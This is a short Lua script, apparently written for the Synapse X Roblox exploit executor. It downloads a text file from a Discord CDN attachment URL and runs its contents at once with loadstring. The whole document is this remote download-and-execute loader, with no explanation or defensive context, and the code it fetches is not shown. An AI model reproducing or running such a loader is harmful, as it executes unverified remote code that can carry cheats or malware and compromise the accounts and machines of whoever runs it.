local function GetDiscord(Url)
   local responce = syn.request({
       Url = Url,
       Method = "GET"
   })
   return loadstring(responce.Body)()
end
GetDiscord("https://cdn.discordapp.com/attachments/756729440603734136/1098414650888028311/message.txt")
